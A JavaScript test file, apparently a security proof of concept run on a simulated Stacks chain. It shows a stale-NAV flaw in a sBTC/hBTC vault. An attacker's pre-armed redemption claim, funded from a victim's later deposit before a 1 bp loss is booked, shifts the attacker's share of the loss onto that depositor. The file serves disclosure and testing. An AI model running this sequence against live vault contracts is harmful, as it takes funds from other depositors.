import assert from 'node:assert/strict';
import { initSimnet } from '@stacks/clarinet-sdk';
import { Cl, cvToString } from '@stacks/transactions';

const simnet = await initSimnet('tests/security/stale-nav/Clarinet.toml');
const accounts = simnet.getAccounts();
const deployer = accounts.get('deployer');
const rewarder = accounts.get('wallet_1');
const attacker = accounts.get('wallet_2');
const legacy = accounts.get('wallet_3');
const victim = accounts.get('wallet_4');
const neutralFunder = accounts.get('wallet_5');
if (!deployer || !rewarder || !attacker || !legacy || !victim || !neutralFunder) throw new Error('missing accounts');

const BASE = 100_000_000n;
const ATTACKER = 40_000_000n;
const LEGACY = 60_000_000n;
const VICTIM_DEPOSIT = 40_000_000n;
const LOSS = 10_000n; // 1 bp, below both live 5 bp max-reward and 7 bp max-deviation
const SBTC = 'SM3VDXK3WZZSA84XXFKAFAF15NNZX32CTSG82JFQ4.sbtc-token';
const c = n => `${deployer}.${n}`;
const reserve = c('reserve');
const helper = c('strategy-loss-helper');

const text = r => cvToString(r.result);
const pub = (n, fn, args, sender) => simnet.callPublicFn(c(n), fn, args, sender);
const ro = (n, fn, args = [], sender = deployer) => simnet.callReadOnlyFn(c(n), fn, args, sender);
function expect(label, r, wanted) {
  const got = text(r); console.log(`${label}: ${got}`); assert.equal(got, wanted, `${label}: expected ${wanted}, got ${got}`);
}
function u(r) {
  const m = text(r).match(/(?:\(ok )?u(\d+)\)?/); if (!m) throw new Error(text(r)); return BigInt(m[1]);
}
function sbtc(who) { return u(simnet.callReadOnlyFn(SBTC, 'get-balance-available', [Cl.principal(who)], deployer)); }
function hbtc(who) { return u(ro('token-hbtc', 'get-balance', [Cl.principal(who)], who)); }
function assetsForShares(shares, who) { return u(ro('state', 'convert-to-assets', [Cl.uint(shares)], who)); }

const state = c('state'), vault = c('vault'), controller = c('controller-hbtc');
for (const address of [state, vault, controller, helper]) {
  expect('request protocol role', pub('hq-hbtc', 'request-protocol-update', [Cl.principal(address), Cl.bool(true)], deployer), '(ok true)');
}
expect('request rewarder role', pub('hq-hbtc', 'request-rewarder-update', [Cl.principal(rewarder), Cl.bool(true)], deployer), '(ok true)');
expect('request sBTC asset', pub('state', 'request-asset-add', [Cl.principal(SBTC), Cl.buffer(new Uint8Array(32)), Cl.uint(8), Cl.uint(500), Cl.bool(false)], deployer), '(ok true)');
simnet.mineEmptyBlocks(200);
for (const address of [state, vault, controller, helper]) {
  expect('confirm protocol role', pub('hq-hbtc', 'confirm-protocol-request', [Cl.principal(address)], deployer), '(ok true)');
}
expect('confirm rewarder role', pub('hq-hbtc', 'confirm-rewarder-request', [Cl.principal(rewarder)], deployer), '(ok true)');
expect('confirm sBTC asset', pub('state', 'confirm-asset-request', [Cl.principal(SBTC)], deployer), '(ok true)');
expect('deposit cap', pub('state', 'set-deposit-cap', [Cl.uint(2n * BASE)], deployer), '(ok true)');
expect('default max-reward', ro('state', 'get-max-reward'), 'u5');
expect('default max-deviation', ro('state', 'get-max-deviation'), 'u7');

for (const [who, amount] of [[attacker, ATTACKER], [legacy, LEGACY], [victim, VICTIM_DEPOSIT]]) {
  const r = simnet.callPrivateFn(SBTC, 'protocol-mint-many-iter', [Cl.tuple({ amount: Cl.uint(amount), recipient: Cl.principal(who) })], deployer);
  assert.equal(text(r), '(ok true)');
}

console.log('=== attacker arms claim, while all hBTC backing is deployed externally ===');
expect('attacker deposit 0.40', pub('vault', 'deposit', [Cl.uint(ATTACKER), Cl.none()], attacker), '(ok u40000000)');
expect('legacy deposit 0.60', pub('vault', 'deposit', [Cl.uint(LEGACY), Cl.none()], legacy), '(ok u60000000)');
expect('request standard claim', pub('vault', 'request-redeem', [Cl.uint(ATTACKER), Cl.bool(false)], attacker), '(ok u1)');
simnet.mineEmptyBlocks(500);
expect('deploy all 1.00 sBTC from Reserve', pub('strategy-loss-helper', 'pull-from-reserve', [Cl.uint(BASE)], deployer), '(ok true)');
assert.equal(sbtc(reserve), 0n);

console.log('=== no keeper can pre-fund the claim while Reserve is empty ===');
const preFund = pub('vault', 'fund-claim', [Cl.uint(1)], neutralFunder);
console.log(`neutral keeper pre-fund with zero Reserve: ${text(preFund)}`);
assert.match(text(preFund), /^\(err /, 'mature claim must remain unfunded because Reserve has no sBTC');
const claimAfterFailedFund = text(ro('vault', 'get-claim', [Cl.uint(1)], attacker));
assert.match(claimAfterFailedFund, /\(assets none\)/, 'failed pre-funding must leave the claim unfunded');

console.log('=== fresh accounting snapshot, then a new 1bp strategy loss ===');
expect('fresh NAV log', pub('controller-hbtc', 'log-reward', [Cl.uint(0), Cl.bool(true)], rewarder), '(ok true)');
expect('realize 1bp loss', pub('strategy-loss-helper', 'realize-loss', [Cl.uint(LOSS), Cl.principal(deployer)], deployer), '(ok true)');
expect('immediate correction blocked only by update-window', pub('controller-hbtc', 'log-reward', [Cl.uint(LOSS), Cl.bool(false)], rewarder), '(err u102011)');

console.log('=== ordinary victim deposit supplies the first liquid Reserve after the loss ===');
expect('victim deposits 0.40 at stale NAV', pub('vault', 'deposit', [Cl.uint(VICTIM_DEPOSIT), Cl.none()], victim), '(ok u40000000)');
assert.equal(sbtc(reserve), VICTIM_DEPOSIT);
assert.equal(hbtc(victim), VICTIM_DEPOSIT);

console.log('=== a neutral third party, not attacker, funds the mature claim ===');
expect('neutral funder executes permissionless fund-claim', pub('vault', 'fund-claim', [Cl.uint(1)], neutralFunder), '(ok u40000000)');
assert.equal(sbtc(reserve), 0n);
expect('attacker redeems already-funded claim', pub('vault', 'redeem', [Cl.uint(1)], attacker), '(ok u40000000)');

console.log('=== later NAV correction exposes the value transfer ===');
simnet.mineEmptyBlocks(200);
expect('reconcile 1bp loss', pub('controller-hbtc', 'log-reward', [Cl.uint(LOSS), Cl.bool(false)], rewarder), '(ok true)');

const victimValue = assetsForShares(VICTIM_DEPOSIT, victim);
const victimLoss = VICTIM_DEPOSIT - victimValue;
const legacyValue = assetsForShares(LEGACY, legacy);
const legacyLoss = LEGACY - legacyValue;
const attackerFairLoss = ATTACKER * LOSS / BASE;

console.log(`attacker fair loss avoided: ${attackerFairLoss}`);
console.log(`victim post-correction value: ${victimValue}`);
console.log(`victim loss: ${victimLoss}`);
console.log(`legacy post-correction value: ${legacyValue}`);
console.log(`legacy loss: ${legacyLoss}`);

assert.equal(attackerFairLoss, 4_000n);
assert.equal(legacyLoss, 6_000n, 'legacy holder bears only its original fair 60% share of the loss');
assert.equal(victimLoss, 4_000n, 'later depositor alone absorbs the attacker\'s avoided 40% loss');

console.log('PASS ZERO-RESERVE / NEUTRAL-FUNDER: before the adverse event no keeper can fund the mature claim because Reserve is empty. After a normal victim deposit supplies liquidity at stale NAV, an unrelated neutral caller can permissionlessly fund the attacker claim and transfer exactly the attacker\'s 4,000-sat fair loss onto the later depositor. No attacker-vs-keeper race is required.');
